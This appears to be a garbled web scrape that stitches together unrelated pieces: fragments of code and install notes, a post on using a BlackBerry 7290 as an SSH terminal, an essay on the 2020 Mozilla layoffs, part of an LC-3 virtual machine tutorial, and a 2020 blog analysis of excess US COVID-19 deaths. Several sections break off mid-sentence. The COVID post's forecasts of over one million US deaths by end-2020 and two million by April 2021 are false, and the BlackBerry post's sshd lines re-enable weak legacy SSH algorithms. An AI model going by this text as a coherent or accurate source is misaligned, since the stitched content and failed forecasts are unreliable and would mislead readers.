  <pre><span></span><span>seasonToString</span> <span>::</span> <span>Season</span> <span>-&gt;</span> <span>S…</span></pre></div></div></article></div></section></div>

installed, check that you have <code>GOPATH</code> set correctly, and it will end
up in <code>$GOPATH/bin</code>. And make sure that its in your path by checking

these dates will be similar, but if the project shares patches over

<h2 id="using-an-old-blackberry-as-a-portable-ssh-or-telnet-terminal">Using an old BlackBerry as a portable SSH (or Telnet) terminal</h2>
<p>You used to see BlackBerries everywhere. Sites such as CrackBerry detailed sightings of celebrities using them constantly. Nowadays, not so much. However, I believe they still have some usecases today. One of these is as a portable terminal. Here's why one might want to use one of these devices as a terminal:</p>
<ul>
<li>Nice built-in physical keyboard</li>
<li>Long standby battery life
<ul>
<li>Easily swappable batteries (see my Altoids tin filled with batteries below!)</li>
<li>The 7290 I'm using reportedly has a 216 hour standby battery life, and unlike modern phones this number seems to hold up relatively well even with network enabled</li>
</ul></li>
<li>Affordable
<ul>
<li>You can easily find these devices for ~$20 on eBay</li>
<li>You can get a 100 MB data plan from US Mobile for $2/mo. not including fees (closer to $5/mo. with fees)</li>
</ul></li>
<li>Extremely portable
<ul>
<li>Much smaller than other devices one might use for this kind of thing
<ul>
<li>OpenPandora</li>
<li>GPD Pocket</li>
<li>etc.</li>
</ul></li>
<li>Much shorter than most modern phones</li>
<li>Cellular connection means you don't need a wireless router around</li>
</ul></li>
<li>Decently rugged
<ul>
<li>Not nearly as prone to failure after drops as modern smartphones (in my experience)
<ul>
<li>The screen is recessed, so it doesn't take the brunt of falls</li>
</ul></li>
</ul></li>
<li>Easy to setup
<ul>
<li>You can simply browse to <a href="http://xk72.com/wap">http://xk72.com/wap</a> on the phone itself to install an SSH client (MidpSSH) over the air</li>
</ul></li>
</ul>
<p>I've been using a BlackBerry 7290 on the US Mobile network, which still supports GSM for now. It's notable that the SSH negotiation is decently slow (~30-45 seconds), but is decently usable after connected (things are still a little sluggish however). Furthermore, I had to reenable the weak DSA public key algorithm as well. This doesn't bother me so much as I basically have a middleman server that allows this weak standard that I talk to everything else through rather than enabling it on every server.</p>
<p>To make things easier on myself, I wrote an <a href="https://rqsall.com/posts/files/postlogin.txt">interactive script</a> that is sourced by <code>.bashrc</code> upon logging in that asks what I actually want to connect to and then does so for me.</p>
<p>In the future, I might move to a BlackBerry 8700(c/g) as they support EDGE (much faster network speed), have much faster CPUs, and a higher standby time. I am not sure what I am going to do in the long run, as 2G networks in the US will probably all be shut down by the end of the year with 3G soon to follow. I guess I can just enjoy it while it lasts.</p>
<p>Here are the lines I added to my <code>sshd</code> config for the BlackBerry to be able to connect:</p>
<pre><code>HostKeyAlgorithms +ssh-dss
PubkeyAcceptedKeyTypes +ssh-dss
KexAlgorithms +diffie-hellman-group1-sha1
Ciphers +3des-cbc
</code></pre>
<p>And here are some pictures!</p>
<p><img src="https://rqsall.com/posts/files/connected.jpg"></p>
<p><em>Connected and at the interactive prompt</em></p>
<p><img src="https://rqsall.com/posts/files/top.jpg"></p>
<p><em><code>top</code> output from one server</em></p>

<p><em>tl;dr: Some thoughts on Mozilla for people who don’t know Mozilla.</em></p>

<p>By now everyone in the tech world has heard of the major layoffs at
the Mozilla Corporation, the organization that creates and distributes
the Firefox web browser. (For those who haven’t heard, about 250
people were laid off, about a quarter of the work force.) Lots of
people in the tech world have spoken their piece about the
significance of this event and what it means for the future of
Mozilla, the web, and so on.</p>

<p>Rather than write something of and for the tech world, I wanted to
briefly explain what’s going on for those of my readers who don’t know
HTML from XML, and who are more familar with the worlds of nonprofits
and regular old businesses. I used to work for Mozilla, and have more
knowledge of it and (I hope) insight into it than most people, but
I’ve been gone from Mozilla for ten years now. Thus what I write below
is based on observing it from a distance, like seeing an old friend
whose life has long since diverged from mine.</p>

<p>Disclaimer: I work for a tech company, and I don’t usually write about
other tech companies. So I will strongly emphasize that what I write
here are my personal opinions only, and do not represent the positions
of my present employer or past employers.</p>

<h2 id="what-is-mozilla">What is Mozilla?</h2>

<p>Mozilla is actually two things, the Mozilla Foundation and the Mozilla
Corporation, which are often confused and conflated in public
discourse. (There’s actually at least one other piece, but these two
are the main ones.) The Mozilla Foundation, founded in 2003 to take
over development of the source code for the Netscape web browser, is a
501(c)(3) tax-exempt nonprofit organization, with a staff of 80 people
and a budget of about $27 million in 2018, the last year for which
figures are available. The Mozilla Corporation, founded in 2005, is a
for-profit business, wholly owned by the Mozilla Foundation, with a
staff of about a thousand and revenue of about $440 million, again
from the 2018 financials.</p>

<p>This organizational structure was designed to allow the Mozilla
Corporation to engage in business activities which would be
incompatible with 501(c)(3) status, with a portion of the revenues
from those activities directed to the Mozilla Foundation to help fund
its activities. Having a nonprofit parent also means that the
management and employees of the Mozilla Corporation can help serve the
public benefit goals of the Mozilla Foundation, while still having
interesting jobs, being paid reasonably well, and feeling themselves
to be part of the overall Silicon Valley high-tech milieu.</p>

<p>Second: The customers of the Mozilla Corporation are not the users of
Firefox (among whom you may count yourself). The Mozilla Corporation’s
customers are large corporations like Google that pay for things that
will help them make money, most notably having their Internet search
service be the default in the Firefox browser. And to complete the old
saying, “If you’re not the customer…”, then the 200+ million Firefox
users are the product, potential viewers of ads served up by Google or
others.</p>

<p>(The existence of the Firefox browser as a competitor to Google’s
Chrome browser also supposedly helps Google avoid unwelcome antitrust
attention, especially now that Microsoft has abandoned its own browser
development efforts to base its own browser on the Chrome code. But
it’s unclear how important this consideration actually is to Google
senior management.)</p>

<p>In the early days of the Mozilla Corporation these search engine
relationships proved extremely lucrative, jumping from less than $5
million in 2004 to over $50 million in 2005, the first year in which
the Mozilla Corporation reported financial results, and eventually
growing to a high of about $540 million in 2017.</p>

<p>But as the number of Firefox users decreases (due to the growing
market dominance of the Chrome browser), and those users click on
fewer online ads (for example, because they’re spending less during
the COVID-19 pandemic), the willingness of Google and other customers
to pay the Mozilla Corporation for those users decreases
accordingly. Thus the Mozilla Corporation cutting a quarter of its
workforce.</p>

<p>(In contrast, to my knowledge the Mozilla Foundation itself is not
laying off anyone, at least at this time. It gets its funding from a
combination of royalties from the Mozilla Corporation for use of the
Firefox and Mozilla trademarks, government and foundation grants, and
individual donations. For 2018 the royalties accounted for about half
of the Mozilla Foundation’s budget, with grants and individual donations
each accounting for about a quarter of the budget.)</p>

<p>So, if you’re an avid user of the Firefox browser and want to chip in
a few dollars to help support its development, there’s actually no way
for you to do so, at least not at present. Your donations will go to
the Mozilla Foundation, which will use them to help fund its outreach
and advocacy initiatives, of which it has several. The Mozilla
Foundation itself does not develop Firefox—or any other software, to
my knowledge.</p>

<h2 id="whence-mozilla">Whence Mozilla?</h2>

<p>How has Mozilla (or, more correctly, the Mozilla Corporation) come
to its present pass? The best way I can explain it is that the Mozilla
Corporation is not really a business in the way we’d normally think of
a business, profit-focused and subject to market discipline.</p>

<p>Instead you can think of the Mozilla Corporation as being analogous to
the Bell Labs or Xerox PARC of yore, R&amp;D organizations funded by a
seemingly-unending stream of profits earned by other businesses that
enjoyed dominant positions in their respective markets. In this sense
Google is to Mozilla as AT&amp;T was to Bell Labs, or Xerox to Xerox
PARC.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation provided a home
for some of the smartest software developers around. Like those
organizations, the Mozila Corporation has initiated a myriad of
projects ranging from the mundane and useful (like the Firefox
browser) to the esoteric and speculative. Like those organizations,
the Mozilla Corporation has given away much of what it has produced in
the form of public goods available to everyone at no charge.</p>

<p>Like Bell Labs and Xerox PARC, the Mozilla Corporation has indulged a
taste for “build it yourself” vertical integration, and in particular
for creating its own bespoke development tools and software stack. For
example, like those organizations the Mozilla Corporation has created
its own operating system (FirefoxOS), its own programming language
(Rust), and (of course) its own graphical user environment in the form
of the Firefox browser (not to mention yet another web browser, this
one more research-oriented, and various experiments in software for
virtual reality environments).</p>

<p>And finally, the Mozilla Corporation is engaged in the same struggle
that Bell Labs and Xerox PARC found themselves in: trying to convert a
research-oriented organization into an actual business, and capture
for itself more of the value that it has been providing to the world
(and to its past, present, and future competitors) for free.</p>

<h2 id="whither-mozilla">Whither Mozilla?</h2>

<p>What will happen to Mozilla, and to the Mozilla Corporation in
particular? The basic situation is that Mozilla has tried to be at
least three things simultaneously: an advocacy organization, a
developer and distributor of mass market consumer software and related
services, and (as noted above) a research lab.</p>

<p>Being an advocacy organization is relatively inexpensive, but the
other two functions are not: software development (including
research-related activities) and branding and marketing together
consumed almost three quarters of the combined Mozilla Corporation and
Foundation expense budget of $450 million in 2018. Thus when COVID-19
hit and the Mozilla Corporation hit a brick wall in terms of search
engine revenue, its choice was apparently either to stop being a
consumer software and services company, or to stop being a research
lab.</p>

<p>In the end Mozilla Corporation senior management apparently decided to
go for being a consumer software and services company, and to ditch
any activities not related to that, including research projects.
Having done so, the Mozilla Corporation faces a number of problems:</p>

<p>First, as noted above the Mozilla ethos is arguably more like that of
an R&amp;D lab than of a business proper. Just getting Mozilla
employees to think of themselves as working in the service of a
profit-driven business, and to act in accordance with that thought
every single day, may be an uphill battle.</p>

<p>Second, Mozilla is arguably becoming superfluous, at least as far as
its own largest customer, Google, is concerned. Google has its own
browser and browser development team, its own research lab, and
presumably an inclination to want to spend its R&amp;D money on things
it can control and direct itself. Google also has the ability and the
opportunity to capture the remaining base of Firefox users, at least
those that are monetizable.</p>

<p>There will always be a core of enthusiastic Firefox users, but a lot
of them switch their search engine to something other than Google, run
ad blockers, and don’t click on online ads. Thus they are for the most
part irrelevant from Google’s point of view. At some point the major
value Firefox has for Google will be as presumed insulation from
antitrust enforcement efforts targeting Chrome, but such insurance,
even if it’s of value to Google, doesn’t necessarily require a large
Firefox user base.</p>

<p>Finally, it’s …</p></section></div>

<section>

<a name="1:1"></a>
<a name="1:2"></a><div><a name="1:2"><h4>2. Introduction</h4></a>
<p>In this tutorial, I will teach you how to write your own virtual machine (VM) that can run assembly language programs, such as my friend's <a href="https://github.com/rpendleton/lc3-2048">2048</a> or my <a href="https://github.com/justinmeiners/lc3-rogue">Roguelike</a>. If you know how to program, but would like to gain a deeper understanding of what is going on inside a computer and better understand how programming languages work, then this project is for you. Writing your own VM may sound a little scary, but I promise that you will find it to be surprisingly simple and enlightening.
</p>
<p>The final code is about 250 lines of C (<a href="https://justinmeiners.github.io/lc3-vm/src/lc3.c">unix</a>, <a href="https://justinmeiners.github.io/lc3-vm/src/lc3-win.c">windows</a>).
All you need to know is how to read basic C or C++ and how to do <a href="https://www.swarthmore.edu/NatSci/echeeve1/Ref/BinaryMath/BinaryMath.html">binary arithmetic</a>.
</p>
<blockquote><p> <strong>Note:</strong> This VM is a <a href="https://en.wikipedia.org/wiki/Literate_programming">literate program</a>. This means you are reading the source code right now! Each piece of code from the project will be shown and explained thoroughly, so you can be sure nothing is left out. The final code was created by <a href="https://github.com/zyedidia/Literate">"weaving"</a> the blocks of code together.
</p>

<h3> What is a virtual machine?</h3>
<p>A VM is a program that acts like a computer. It simulates a CPU along with a few other hardware components, allowing it to perform arithmetic, read and write to memory, and interact with I/O devices, just like a physical computer. Most importantly, it can understand a machine language which you can use to program it.
</p>
<p>The amount of computer hardware the VM attempts to simulate depends on its purpose. Some VMs are designed to reproduce the behavior of some particular computer, such as video game emulators. Most people don't have an NES lying around anymore, but we can still play NES games by simulating the NES hardware in a program. These emulators must <a href="http://wiki.nesdev.com/w/index.php/Tricky-to-emulate_games">faithfully recreate</a> every <a href="http://wiki.nesdev.com/w/index.php/Emulator_tests">detail</a> and major hardware component of the original device.
</p>
<p>Other VMs don't act like any real computer and are entirely made up! This is primarily done to make software development easier. Imagine you wanted to create a program that ran on multiple computer architectures. A VM could offer a standard platform which provided portability for all of them. Instead of rewriting a program in different dialects of assembly for each CPU architecture, you would only need to write the small VM program in each assembly language. Each program would then be written only once in the VM's assembly language.
</p>

</p>
<p><img src="https://justinmeiners.github.io/lc3-vm/img/vm.gif" alt="vm for each architecture">
</p>
<blockquote><p> <strong>Note:</strong> A compiler solves a similar problem by compiling a standard <em>high-level language</em> to several CPU architectures. A VM creates one standard <em>CPU architecture</em> which is simulated on various hardware devices. One advantage of a compiler is that it has no runtime overhead while a VM does. Even though compilers do a pretty good job, writing a new one that targets multiple platforms is very difficult, so VMs are still helpful here. In practice, VMs and compilers are mixed at various levels.
</p>
</blockquote>
<p>The <a href="https://en.wikipedia.org/wiki/Java_virtual_machine">Java Virtual Machine (JVM)</a> is a very successful example. The JVM itself is a moderately sized program that is small enough for one programmer to understand. This has made it possible to be written for thousands of devices including phones. Once the JVM is implemented on a new device, any Java, Kotlin, or Clojure program ever written can run on it without modification. The only cost is the overhead of the VM itself and the <a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/">further abstraction</a> from the machine. Most of the time, this is a pretty good tradeoff.
</p>
<p>A VM doesn't have to be large or pervasive to provide a similar benefit. Old <a href="https://fabiensanglard.net/anotherWorld_code_review/">video games</a> often used small VMs to provide simple <a href="https://sf2platinum.wordpress.com/page/1/">scripting systems</a>.
</p>
<p>VMs are also useful for executing code in a secure or isolated way. One application of this is garbage collection. There <a href="https://www.lua.org/pil/24.2.html">is no trivial way</a> to implement automatic garbage collection on top of C or C++ since a program cannot see its own stack or variables. However, a VM is “outside” the program it is running and can observe all of the <a href="https://en.wikipedia.org/wiki/Tracing_garbage_collection">memory references</a> on the stack.
</p>
<p>Another example of this behavior is demonstrated by <a href="https://solidity.readthedocs.io/en/v0.4.24/introduction-to-smart-contracts.html">Ethereum smart contracts</a>. Smart contracts are small programs which are executed by each validating node in the blockchain network. This requires the node operators to run programs on their machines that have been written by complete strangers, without any opportunity to scrutinize them beforehand. To prevent a contract from doing malicious things, they are run inside a <a href="http://ethdocs.org/en/latest/introduction/what-is-ethereum.html#ethereum-virtual-machine">VM</a> that has no access to the file system, network, disc, etc. Ethereum is also a good application of the portability features that result when using a VM. Since Ethereum nodes can be run on many kinds of computers and operating systems, the use of a VM allows smart contracts to be written without any consideration of the many platforms they run on.

<p>Our VM will simulate a fictional computer called the <a href="https://en.wikipedia.org/wiki/Little_Computer_3">LC-3</a>. The LC-3 is popular for teaching university students how to program in assembly language. It has a simplified instruction set <a href="http://ref.x86asm.net/coder64.html">compared to x86</a>, but contains all the main ideas used in modern CPUs.
</p>
<p>First, we need to simulate the essential hardware components of the machine. Try to understand what each component is, but don't worry right now if you are unsure of how it fits into the larger picture. Start by creating a C file. Each of the code snippets in this section should be placed in the global scope of this file.
</p>
<h3> Memory</h3>
<p>The LC-3 has 65,536 memory locations (the maximum that is addressable by a 16-bit unsigned integer <code>2^16</code>), each of which stores a 16-bit value. This means it can store a total of only 128kb, which is a lot smaller than you may be used to! In our program, this memory will be stored in a simple array:
</p>

<div>
<p><span>{Memory Storage <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>/* 65536 locations */
uint16_t memory[UINT16_MAX];
</pre>


<p>Used in section <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:11">11</a></p>
</div>
<h3> Registers</h3>
<p>A register is a slot for storing a single value on the CPU. Registers are like the "workbench" of the CPU. For the CPU to work with a piece of data, it has to be in one of the registers. However, since there are just a few registers, only a minimal amount of data can be loaded at any given time. Programs work around this by loading values from memory into registers, calculating values into other registers, and then storing the final results back in memory.
</p>
<p>The LC-3 has 10 total registers, each of which is 16 bits. Most of them are general purpose, but a few have designated roles.
</p>
<ul>
<li>8 general purpose registers  (<code>R0</code>-<code>R7</code>)
</li>
<li>1 program counter (<code>PC</code>) register
</li>
<li>1 condition flags (<code>COND</code>) register
</li>
</ul>
<p>The general purpose registers can be used to perform any program calculations. The program counter is an unsigned integer which is the address of the next instruction in memory to execute. The condition flags tell us information about the previous calculation.
</p>

<div>
<p><span>{Registers <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>enum
{
    R_R0 = 0,
    R_R1,
    R_R2,
    R_R3,
    R_R4,
    R_R5,
    R_R6,
    R_R7,
    R_PC, /* program counter */
    R_COND,
    R_COUNT
};
</pre>



</div>
<p>Just like the memory, we will store the registers in an array:
</p>

<div>
<p><span>{Register Storage <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>uint16_t reg[R_COUNT];
</pre>


<p>Used in section <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:11">11</a></p>
</div>
<h3> Instruction Set</h3>
<p>An instruction is a command which tells the CPU to do some fundamental task, such as add two numbers. Instructions have both an <strong>opcode</strong> which indicates the kind of task to perform and a set of <strong>parameters</strong> which provide inputs to the task being performed.
</p>
<p>Each <strong>opcode</strong> represents one task that the CPU "knows" how to do. There are just 16 opcodes in LC-3. Everything the computer can calculate is some sequence of these simple instructions. Each instruction is 16 bits long, with the left 4 bits storing the opcode. The rest of the bits are used to store the parameters.
</p>
<p>We will discuss, in detail, what each instruction does later. For now, define the following opcodes. Make sure they stay in this order so that they are assigned the proper enum value:
</p>

<div>
<p><span>{Opcodes <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>enum
{
    OP_BR = 0, /* branch */
    OP_ADD,    /* add  */
    OP_LD,     /* load */
    OP_ST,     /* store */
    OP_JSR,    /* jump register */
    OP_AND,    /* bitwise and */
    OP_LDR,    /* load register */
    OP_STR,    /* store register */
    OP_RTI,    /* unused */
    OP_NOT,    /* bitwise not */
    OP_LDI,    /* load indirect */
    OP_STI,    /* store indirect */
    OP_JMP,    /* jump */
    OP_RES,    /* reserved (unused) */
    OP_LEA,    /* load effective address */
    OP_TRAP    /* execute trap */
};
</pre>



</div>
<blockquote><p> <strong>Note:</strong> The Intel x86 architecture has hundreds of instructions, while others such as ARM and LC-3 have very few. Small instruction sets are referred to as <a href="https://en.wikipedia.org/wiki/Reduced_instruction_set_computer">RISCs</a> while larger ones are called <a href="https://en.wikipedia.org/wiki/Complex_instruction_set_computer">CISCs</a>. Larger instruction sets typically do not provide any fundamentally new possibilities, but they <a href="https://cs.stanford.edu/people/eroberts/courses/soco/projects/risc/risccisc/">often make it more convenient</a> to write assembly for. A single instruction in CISC might take the place of several in RISC. However, they tend to be more complex and expensive for engineers to design and manufacture. This and other tradeoffs cause the designs to come <a href="https://cs.stackexchange.com/questions/269/why-would-anyone-want-cisc">in and out of style</a>.
</p>
</blockquote>
<h3> Condition Flags</h3>
<p>The <code>R_COND</code> register stores condition flags which provide information about the most recently executed calculation. This allows programs to check logical conditions such as <code>if (x &gt; 0) { ... }</code>.
</p>
<p>Each CPU has a variety of condition flags to signal various situations. The LC-3 uses only 3 condition flags which indicate the sign of the previous calculation.
</p>

<div>
<p><span>{Condition Flags <a href="https://justinmeiners.github.io/lc3-vm/index.html#1:3">3</a>}</span></p><pre>enum
{
    FL_POS = 1 &lt;&lt; 0, /* P */
    FL_ZRO = 1 &lt;&lt; 1, /* Z */
    FL_NEG = 1 &lt;&lt; 2, /* N */
};
</pre>



</div>
<blockquote><p> <strong>Note:</strong> (The <code>&lt;&lt;</code> symbol is called the <a href="https://msdn.microsoft.com/en-us/library/336xbhcz.aspx">left bitshift operator</a>. <code>(n &lt;&lt; k)</code> shifts the bits of <code>n</code> to the left <code>k</code> places. Thus <code>1 &lt;&lt; 2</code> will equal <code>4</code>. Read that link if you are not familiar. It will be important.)

<p>We are finished setting up the hardware components of our VM! After adding standard includes (see reference), your file should look something like this:
</p>

<p>Now let's look at an LC-3 assembly program to get an idea of what the VM actually runs. You don't need to know how to program assembly or understand everything that is going on. Just try to get a general idea of what is going on. Here is a simple "Hello World":

<p><a href="https://austingwalters.com/covid-19-u-s-fatalities-june-2020-update/" target="_blank" rel="noopener noreferrer">In June</a>, I made the prediction that it’s likely we’ll see hundreds of thousands dead by July from COVID-19.</p>
<p>According to official data, my prediction <span><em>was not entirely accurate</em></span>, being closer to the lower bound of my simulation(s) (a hundred thousand).</p>
<p>Today, we have more information about the virus and importantly improved data on death rates (via the CDC) – <strong>it appears the official death toll from COVID19 may be under reported</strong>. Perhaps more terrifying, it also appears <strong>if you are 25-85+ years old you have a 20-50% increased risk of dying in 2020 than you did in 2015-2019</strong> (given COVID19’s current penetration rate).</p>
<p>Some key takeaways from this analysis:</p>
<ul>
<li>Official death COVID19 related deaths are likely higher than official count(s)</li>
<li>Testing capacity appears to be shrinking or not being reported</li>
<li>Age groups over 25 are seeing a 20-50% increased number of deaths in 2020 (over 2015-2019)</li>
<li>It is likely the increased fatality rate over prior years will continue as COVID19 prevalence increases</li>
<li>By year end 2020, it’s likely we will see over one million deaths in the U.S.</li>
<li>By April 2021, it’s likely we will see over two million deaths in the U.S.</li>
</ul>
<p>For transparency:</p>
<ul>
<li>Code (&amp; Graphics): <a href="https://github.com/lettergram/covid19-analysis">Github</a></li>
<li>Data

<li>Covidtracking.com: <a href="https://covidtracking.com/api/states/daily" rel="nofollow">https://covidtracking.com/api/states/daily</a></li>

<li>CDC data is only [mostly] accurate up to the week of July 20 – 26, 2020</li>
</ul>
</li>
</ul>

<p>First and foremost, we aren’t testing enough to capture all cases. People are not being tested for various reasons: desire to work, no/minor symptoms, can’t receive a test, etc. Unfortunately, this will leave us vulnerable.</p>
<p>On a whole, the nation wide positive rate is still hovering well above lows, with around 7% tests coming back positive.</p>

<p>It is not clear if the reduction in tests are from collection errors, reduced testing capacity, issues with the data provider or some other unknown factor.</p>

<p>Overall, our accounting of deaths from the <a href="https://www.cdc.gov/nchs/nvss/vsrr/covid19/excess_deaths.htm" target="_blank" rel="noopener noreferrer">CDC</a> is only accurate up to the week of July 20 – 26, 2020, from week 1 to week 30 there has been 216,569 more deaths in 2020 over 2019.</p>

<p>It’s important to note, that it is not an entirely fair to compare 2019 to 2020, as each year has variance in deaths. With this in mind, I also created a simple regression model, then compared the predicted death count to the actual 2020 deaths and came to figure of <strong>178,598.40 deaths over the predicted number</strong> (remember, this is for the week of July 20, 2020):</p>

<p>Currently, in August — nearly three weeks passed the CDC numbers cut off and deaths are still increasing. At this point, it is likely we are well over 200,000+ deaths beyond the prediction. Further, it is quite possible we are now 250,000+ deaths above the 2019 figures. If true, we are likely under counting COVID related deaths by 40-60%.</p>
<p>This analysis doesn’t take into account mitigating factors (such as less car accidents) as it also doesn’t take into account confounding factors (such as more suicides).</p>
<h2><span>States Under Reporting COVID-19 Related Fatalities</span></h2>
<p>To highlight the clear under reporting of pandemic related fatalities, we can review states, where the issue becomes more pronounced.</p>
<p>Take <strong>Texas</strong>, for instance:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png" alt="" width="650" height="485" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-203x150.png 203w" sizes="(max-width: 650px) 100vw, 650px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-TX-203x150.png 203w"></a>The deaths one standard deviation above the norm (norm being deaths in 2015-2019) are highly correlate with the number of <em>new cases </em>of COVID19, rather than that of COVID19 related <em>deaths</em>.</p>
<p>This implies one of the following:</p>
<ol>
<li>COVID19 deaths are being attributed to another illness</li>
<li>Hospitals are focusing on the COVID19 patients and other critically ill patients are dying (at an alarming rate)</li>
<li>Some other catastrophe is happening</li>
</ol>
<p>Regardless, as more people test positive, more people are dying and there is a high correlation between the two. If I had to guess, this really means people aren’t being tested until after they are dead or critically ill &amp; in the hospital.</p>
<h2><span>Decreased Testing</span></h2>
<p>It’s also important to bring attention to the <span>decreasing number of tests from July 9, 2020 and August 13, 2020</span>. Time will tell if the rate of fatalities will drop (or if just the COVID19 related deaths will), the decreased testing volume correlates exactly with the declining positive cases (as one would suspect).</p>
<p>This holds true for many states, including <strong>Florida</strong>:<a href="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-1024x769.png" alt="" width="650" height="488" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-1024x769.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-300x225.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-768x577.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-1536x1153.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-2048x1538.png 2048w" sizes="(max-width: 650px) 100vw, 650px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-1024x769.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-1024x769.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-300x225.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-768x577.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-1536x1153.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-FL-2048x1538.png 2048w"></a>Testing capacity in Florida has dropped 40% in the past six weeks. At the same time, the death toll is rising. Frankly, I wouldn’t be surprised if reduced testing was a ploy related to opening schools.</p>
<p>There are some examples where the figures do appear to be <em>generally</em> accurate, such as <strong>New York</strong>:<a href="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-1024x765.png" alt="" width="650" height="485" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-203x150.png 203w" sizes="(max-width: 650px) 100vw, 650px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-1024x765.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-NY-203x150.png 203w"></a>Another example is <strong>Illinois </strong>(although initially there was likely under-reporting due to lack of testing):</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-1024x765.png" alt="" width="650" height="485" srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-203x150.png 203w" sizes="(max-width: 650px) 100vw, 650px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-1024x765.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-1024x765.png 1024w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-300x224.png 300w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-768x574.png 768w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-1536x1147.png 1536w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-2048x1529.png 2048w, https://austingwalters.com/wp-content/uploads/2020/08/us-stats-in-IL-203x150.png 203w"></a>In terms of which states are more prone to under-reporting vs others, there doesn’t appear to be a clear pattern. Under-reporting appears to be a signal that there is not enough testing – aka the system is overwhelmed. This makes logical sense, as the system becomes overwhelmed, resources are diverted on saving lives over identifying community spread. There’s also a question if the test results are being reported federally and outside my dataset for some reason.</p>

